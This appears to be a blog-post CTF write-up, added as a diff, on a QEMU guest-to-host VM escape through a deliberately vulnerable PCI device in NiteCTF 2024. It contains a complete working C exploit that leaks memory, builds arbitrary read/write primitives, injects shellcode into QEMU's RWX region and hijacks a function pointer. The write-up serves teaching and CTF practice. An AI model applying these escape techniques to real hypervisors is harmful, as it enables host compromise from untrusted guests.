@@ -1,0 +1,511 @@
+---
+title: Qemu Guest to Host VM Escape - NiteCTF 2024
+date: 2024-12-17
+postLayout: simple
+cover: '@/assets/cover/QEMU.jpg'
+tags:
+- "linux"
+- "ctf"
+---
+
+import Figure from "@/components/Figure.astro"
+import qemu_debug from "@/assets/qemu_debug.png"
+import qemu_poc from "@/assets/qemu_poc.png"
+
+In this post I am going to cover everything I learnt about QEMU VM Escape which means the attacker will be able to execute code on the host machine by exploiting a QEMU component from the guest machine.
+In this challenge the vulnerable component is a custom PCI driver which we are going to look later on. 
+
+> Description: Why does a PCI device need BARs? Just use configuration registers, that's way more efficient! Note: Patch is based on top of QEMU master commit f1dd640896ee2b50cb34328f2568aad324702954. Login using 'root' without password and get the flag at /flag.
+
+> Author: Skryptonyte
+
+## Environment Setup
+
+Let us first build QEMU from source which helps in our debugging process.
+
+```bash
+sudo apt install -y git ninja-build libglib2.0-dev libpixman-1-dev zlib1g-dev build-essential
+git clone https://gitlab.com/qemu-project/qemu.git
+cd qemu
+git checkout f1dd640896ee2b50cb34328f2568aad324702954 # Revert to this comment mentioned in the challenge description
+git apply ../001-patch                                # apply the patch provided in the challenge files
+mkdir build && cd build
+../configure --target-list=x86_64-softmmu
+make -j$(nproc)
+```
+The provided steps will build qemu with debug symbols on top of `f1dd640896ee2b50cb34328f2568aad324702954` commit.
+We can use the `build/qemu-system-x86_64` for debugging and writing our exploit and then later port the exploits to original qemu running in the challenge server.
+
+<Figure src={qemu_debug} alt="">QEMU debug environment setup</Figure>
+
+We can now have source level debugging with qemu.
+We also need to share our exploit written in our host and run it on our qemu guest machine. For that i modified the run script to add these statements before qemu is started.
+
+```bash
+sudo modprobe nbd
+sudo qemu-nbd --connect=/dev/nbd0 rootfs.ext2
+sudo mount /dev/nbd0 /mnt
+
+gcc expl.c -o exp -lpci
+sudo cp exp /mnt/root
+
+sudo umount /mnt
+sudo qemu-nbd --disconnect /dev/nbd0
+```
+
+This will compile and place our exploit program in the /root directory in the guest file system.
+
+## Vulnerable PCI Driver
+
+```c
+static void nite_pci_class_init(ObjectClass *klass, void *data)
+{
+    DeviceClass *dc = DEVICE_CLASS(klass);
+    PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);
+
+    k->config_write = nite_config_write;
+    k->config_read = nite_config_read;
+    k->realize = nite_realize;
+    k->vendor_id = 0x6969;
+    k->device_id = 0x6969;
+    k->revision = 0x00;
+    k->class_id = PCI_CLASS_OTHERS;
+    dc->desc = "NiteCTF 2024 - Just a PCI device :D";
+}
+```
+To find the PCI driver run `lspci` 
+```
+# lspci
+00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
+00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
+00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
+00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
+00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
+00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
+00:04.0 Unclassified device [00ff]: Device 6969:6969
+00:05.0 SCSI storage controller: Red Hat, Inc. Virtio block device
+# 
+```
+
+So we know that the driver is located at `/sys/devices/pci0000:00/0000:00:04.0/` with the device `vendor_id` and `device_id` set to `0x6969`. We can communicate with the driver using
+
+```c
+#define PCI_DEVICE_PATH "/sys/bus/pci/devices/0000:00:04.0"  // Update with your PCI device path
+
+...
+
+    // Open the PCI device file (this assumes you have permission)
+    pci_fd = open(PCI_DEVICE_PATH "/config", O_RDWR);
+    if (pci_fd == -1) {
+        perror("Error opening PCI device");
+        return 1;
+    }
+
+```
+
+The given PCI driver allowed R/W access to memory through config and special port address (0xE0 & 0xE4).
+
+```c
+static uint32_t nite_config_read(PCIDevice *dev,
+                                 uint32_t addr, int len)
+{
+    PCINiteDevState *nitedev = NITE_PCI_DEV(dev);
+
+    if (addr == 0xe4) {
+        if (nitedev->addr >= 32)
+            return 0xffffffff;
+        return nitedev->mem[nitedev->addr];
+    } else {
+        return pci_default_read_config(dev, addr, len);
+    }
+}
+
+static void nite_config_write(PCIDevice *dev,
+                                    uint32_t addr, uint32_t val, int len)
+{
+    PCINiteDevState *nitedev = NITE_PCI_DEV(dev);
+
+    if (addr == 0xe0) {
+        nitedev->addr = val; 
+    } else if (addr == 0xe4) {
+        if (nitedev->addr >= 32)
+            return;
+        nitedev->mem[nitedev->addr] = val;
+    } else {
+        pci_default_write_config(dev, addr, val, len);
+    }
+}
+```
+
+The respective useland code to access `nite_config_read` & `nite_config_write` are 
+
+```c
+// Function to interact with the PCI device's configuration space
+void nite_config_write(int pci_fd, uint32_t addr, uint32_t value) {
+    lseek(pci_fd, addr, SEEK_SET); // Seek to the address
+    write(pci_fd, &value, CONFIG_LEN);  // Write the value to the address
+
+}
+
+int nite_config_read(int pci_fd, uint32_t addr) {
+    int value = 0;
+    lseek(pci_fd, addr, SEEK_SET); // Seek to the address
+    read(pci_fd, &value, CONFIG_LEN); // Read the value from the address
+
+    return value;
+}
+```
+
+### Vulnerability
+
+With the `nite_config_write` function we can set the `nitedev->addr` to any value using port address 0xE0 but we cannot write out of bounds. 
+With the `nite_config_read` function we can read values from `nitedev->mem` array where `nitedev->addr` < = 32 using the port address 0xE4. 
+
+Notice that `nite_config_read` & `nite_config_write` function is missing a check to see whether the `nitedev->addr < = 0`.
+
+```c
+static uint32_t nite_config_read(PCIDevice *dev,
+                                 uint32_t addr, int len)
+{
+
+...
+
+    if (addr == 0xe4) {
+        if (nitedev->addr >= 32)
+            return 0xffffffff;
+        return nitedev->mem[nitedev->addr];
+    } else {
+
+...
+
+}
+```
+
+This leads to `Integer Underflow` bug. 
+We can use this bug in `nite_config_read` to read values from `nitedev->mem[nitedev->addr]` where `nitedev->addr` can go negative. Using this we can leak the heap address, PIE address of QEMU and also the RWX JIT region created by QEMU where we are going to place our shellcode.
+The same way we can use `nite_config_write` to overwrite values using negative offset in `nitedev->addr`. We will use this to achieve arbitrary address read and arbitrary address write later on.
+
+Write these helper functions to read and write 64 bit values relative to `nitedev->mem[nitedev->addr]`
+
+```c
+uint64_t u64_read(int offset)
+{
+    uint32_t high;
+    uint32_t low;
+
+    nite_config_write(pci_fd, 0xE0, offset);
+    high = nite_config_read(pci_fd, 0xE4);
+
+    nite_config_write(pci_fd, 0xE0, offset-1);
+    low = nite_config_read(pci_fd, 0xE4);
+
+    return ((uint64_t)high << 32) | low;
+}
+
+uint64_t u64_write(int offset, uint64_t value)
+{
+
+    uint32_t high = (value >> 32) & 0xFFFFFFFF;
+    uint32_t low = value & 0xFFFFFFFF;         
+
+    nite_config_write(pci_fd, 0xE0, offset);
+    nite_config_write(pci_fd, 0xE4, low);
+    nite_config_write(pci_fd, 0xE0, ( offset > 0 ) ? offset-1 : offset+1 );
+    nite_config_write(pci_fd, 0xE4, high);
+
+}
+```
+## Exploit 
+
+### Getting leaks
+
+To find the negative index offsets to get leaks. Just write a simple code using the `u64_read` wrapper function to read all values from -1 to -0xffff
+
+```c
+    for (int i = -1; i <= 0xffff; i-=2)
+    {
+        printf(GREEN "[%d]" RESET " heap base : " BOLD "0x%lX\n" RESET, i , u64_read(i));
+    }
+```
+
+With this you will be able to find out the negative offsets to get all the leaks and I ended up choosing these offsets.
+
+```c
+    heap_base = u64_read(-1)-0x113d200;
+    printf(GREEN "[*]" RESET " heap base : " BOLD "0x%lX\n" RESET, heap_base);
+
+    pie_base = u64_read(-357)-0x426760;
+    printf(GREEN "[*]" RESET " pie base : " BOLD "0x%lX\n" RESET, pie_base);
+
+    rop_addr = heap_base + 0x113dcec;
+    printf(GREEN "[*]" RESET " ROP addr : " BOLD "0x%lX\n" RESET, rop_addr);
+
+    rwxp_region_ptr = u64_read(-1001)-0x3120+0x14650;
+    printf(GREEN "[*]" RESET " RWXP ptr : " BOLD "0x%lX\n" RESET, rwxp_region_ptr);
+```
+
+I will explain how i got the address to `rwxp_region_ptr` later.
+Now that we have all the leaks we needed, lets move on to get arbitrary read and arbitrary write primitive in our exploit.
+
+### Arbitrary R/W
+
+When you dont issue a read or write operation on the port address 0xE4 or 0xE0. The driver defaults to read and write from its config space using `pci_default_read_config` & `pci_default_write_config`.
+Print the structure of nitedev after setting up a breakpoint in nite_config_read or nite_config_write function.
+
+```json
+pwndbg> p *nitedev 
+$1 = {
+  parent_obj = {
+    qdev = {
+      parent_obj = {
+        class = 0x60f4c37dd410,
+        free = 0x7c93ed4bb6f0 <g_free>,
+
+...
+
+    config = 0x60f4c480fd60 "iiii\003\001",
+
+...
+
+    config_read = 0x60f4bd3a5580 <nite_config_read>,
+    config_write = 0x60f4bd3a5350 <nite_config_write>,
+
+...
+
+  },
+  mem = {0 <repeats 32 times>},
+  addr = 0
+}
+```
+
+We can see there are some useful members in the PCIDevice structure like the function pointers `config_read` & `config_write`, The `config` is the pointer to the device config space.
+We can overwrite the `config` member using negative bounds access to an arbitrary address we want after getting the leaks to achieve read or write primitive.
+
+To achieve arbitrary read primitive. 
+- We will first set the `config` member to the address where we want to read.
+- We will then call `nite_config_read` function on port address 0 to read 4bytes from the config space.
+- With this we will be able to achieve arbitrary read primitive
+
+The same way we can achieve arbitrary write primitive by setting `config` member to the address where we want to write.
+
+To overwrite the `config` member to our address we can use the offset `-656`. This is how you can find the offset.
+
+```asm
+pwndbg> x/gx 0x60F4C480E4DC # address to nitedev->mem
+0x60f4c480e4dc:	0xdeadbeefdeadbeef
+
+pwndbg> search -p 0x60f4be9a68d0 # address of PCIDevice.config
+Searching for value: b'\xd0h\x9a\xbe\xf4`\x00\x00'
+[heap]          0x60f4c480da98 0x60f4be9a68d0 (gdbserver_state+4016)
+[anon_7c9393e00] 0x7c9399e89ca0 0x60f4be9a68d0 (gdbserver_state+4016)
+
+pwndbg> p/d (0x60F4C480E4DC-0x60f4c480da98)/4 # (nitedev->mem - PCIDevice.config) / 4
+$5 = 657
+pwndbg> 
+```
+
+So we can use this helper function to achieve arbitrary read primitive.
+
+```c
+uint64_t arb_read(uint64_t addr)
+{
+    u64_write(-656, addr); // set config addr
+    uint32_t high;
+    uint32_t low;
+
+    high = nite_config_read(pci_fd, 4);
+    low = nite_config_read(pci_fd, 0);
+
+    return ((uint64_t)high << 32) | low;
+}
+```
+
+Looking at the memory mappings of qemu with `vmmap` command we can see that it has allocated a region with RWX. 
+
+```
+    0x7c939c000000     0x7c93dbfff000 rwxp 3ffff000      0 [anon_7c939c000]
+```
+
+Search for pointers storing this address using the command `search -p 0x7c939c000000`. We can find the pointer for the RWX region. We know the address of the RWX pointer with our leaks on stage 1. We can use the arbitrary read primitive to get the address of RWX region.
+
+We can now move on to write our shellcode to the rwxp region.
+
+```c
+    u64_write(-656, rwxp_region+0x100);
+
+    int sc[] = { 
+        0x50ec8348, 0x0101b848, 0x01010101, 0x48500101,
+        0x6d672eb8, 0x01016660, 0x04314801, 0x58026a24,
+        0x31e78948, 0x3140b6d2, 0x48050ff6, 0x8948d429,
+        0x48c031c7, 0x050fe689, 0x6ac28948, 0x016a5801,
+        0xe689485f, 0x0000050f
+    }; // Open Read Write /flag shellcode
+
+    int cnt = 0;
+
+    for (int i = 0; i <= 0xff+1; i+=4)
+    {
+        if ( i<= 0x48)
+            nite_config_write(pci_fd, i, 0xdeadbeef); // starting write fails due to some qemu mask internals
+        else
+            nite_config_write(pci_fd, i, sc[cnt++]);
+    }
+
+    printf(GREEN "[*]" RESET " Finished writing shellcode @ : " BOLD "0x%lX\n" RESET, rwxp_region+0x14c);
+```
+
+The final step is to get RIP control. For this we can overwrite the function pointer of `nite_config_read` with our shellcode address. We can find the offset to `nite_config_read` using the same steps that i showed before.
+So the final step in exploit is just 
+
+```c
+    u64_write(-378, rwxp_region+0x14c); // overwrite `nite_config_read` function pointer to point to our shellcode
+    nite_config_read(pci_fd, 0xdeadbeef); // trigger our exploit
+```
+
+### Complete Exploit
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <fcntl.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <string.h>
+
+#define PCI_DEVICE_PATH "/sys/bus/pci/devices/0000:00:04.0"  // Update with your PCI device path
+
+// Define the address for nite_config_read/write (as per your driver implementation)
+#define NITE_CONFIG_ADDR 0xe4
+#define NITE_CONFIG_ADDR_WRITE 0xe0
+
+// Define the number of bytes to read/write (use 4 for a 32-bit value)
+#define CONFIG_LEN 4
+
+// Define the register offset and values
+#define REGISTER_SIZE 4
+
+#define GREEN   "\033[32m"
+#define RESET   "\033[0m"
+#define BOLD    "\033[1m"
+
+int pci_fd;
+
+// Function to interact with the PCI device's configuration space
+void nite_config_write(int pci_fd, uint32_t addr, uint32_t value) {
+    lseek(pci_fd, addr, SEEK_SET); // Seek to the address
+    write(pci_fd, &value, CONFIG_LEN);  // Write the value to the address
+
+}
+
+int nite_config_read(int pci_fd, uint32_t addr) {
+    int value = 0;
+    lseek(pci_fd, addr, SEEK_SET); // Seek to the address
+    read(pci_fd, &value, CONFIG_LEN); // Read the value from the address
+
+    return value;
+}
+
+uint64_t u64_read(int offset)
+{
+    uint32_t high;
+    uint32_t low;
+
+    nite_config_write(pci_fd, 0xE0, offset);
+    high = nite_config_read(pci_fd, 0xE4);
+
+    nite_config_write(pci_fd, 0xE0, offset-1);
+    low = nite_config_read(pci_fd, 0xE4);
+
+    return ((uint64_t)high << 32) | low;
+}
+
+uint64_t u64_write(int offset, uint64_t value)
+{
+
+    uint32_t high = (value >> 32) & 0xFFFFFFFF;
+    uint32_t low = value & 0xFFFFFFFF;         
+
+    nite_config_write(pci_fd, 0xE0, offset);
+    nite_config_write(pci_fd, 0xE4, low);
+    nite_config_write(pci_fd, 0xE0, ( offset > 0 ) ? offset-1 : offset+1 );
+    nite_config_write(pci_fd, 0xE4, high);
+
+}
+
+uint64_t arb_read(uint64_t addr)
+{
+    u64_write(-656, addr); // set config addr
+    uint32_t high;
+    uint32_t low;
+
+    high = nite_config_read(pci_fd, 4);
+    low = nite_config_read(pci_fd, 0);
+
+    return ((uint64_t)high << 32) | low;
+}
+
+int main() {
+    
+    // Open the PCI device file (this assumes you have permission)
+    pci_fd = open(PCI_DEVICE_PATH "/config", O_RDWR);
+    if (pci_fd == -1) {
+        perror("Error opening PCI device");
+        return 1;
+    }
+
+    uint64_t heap_base;
+    uint64_t pie_base;
+    uint64_t rop_addr;
+    uint64_t rwxp_region_ptr;
+    uint64_t rwxp_region;
+
+    heap_base = u64_read(-1)-0x113d200;
+    printf(GREEN "[*]" RESET " heap base : " BOLD "0x%lX\n" RESET, heap_base);
+
+    pie_base = u64_read(-357)-0x426760;
+    printf(GREEN "[*]" RESET " pie base : " BOLD "0x%lX\n" RESET, pie_base);
+
+    rop_addr = heap_base + 0x113dcec;
+    printf(GREEN "[*]" RESET " ROP addr : " BOLD "0x%lX\n" RESET, rop_addr);
+
+    rwxp_region_ptr = u64_read(-1001)-0x3120+0x14650;
+    printf(GREEN "[*]" RESET " RWXP ptr : " BOLD "0x%lX\n" RESET, rwxp_region_ptr);
+
+    rwxp_region = arb_read(rwxp_region_ptr);
+    printf(GREEN "[*]" RESET " RWXP region : " BOLD "0x%lX\n" RESET, rwxp_region);
+
+    getchar();
+
+    u64_write(-656, rwxp_region+0x100);
+
+    int sc[] = { 
+        0x50ec8348, 0x0101b848, 0x01010101, 0x48500101,
+        0x6d672eb8, 0x01016660, 0x04314801, 0x58026a24,
+        0x31e78948, 0x3140b6d2, 0x48050ff6, 0x8948d429,
+        0x48c031c7, 0x050fe689, 0x6ac28948, 0x016a5801,
+        0xe689485f, 0x0000050f
+    };
+
+    int cnt = 0;
+
+    for (int i = 0; i <= 0xff+1; i+=4)
+    {
+        if ( i<= 0x48)
+            nite_config_write(pci_fd, i, 0xdeadbeef);
+        else
+            nite_config_write(pci_fd, i, sc[cnt++]);
+    }
+
+    printf(GREEN "[*]" RESET " Finished writing shellcode @ : " BOLD "0x%lX\n" RESET, rwxp_region+0x14c);
+
+    getchar();
+
+    u64_write(-378, rwxp_region+0x14c);
+    nite_config_read(pci_fd, 0xdeadbeef);
+
+    return 0;
+}
+```
+<Figure src={qemu_poc} alt=""></Figure>
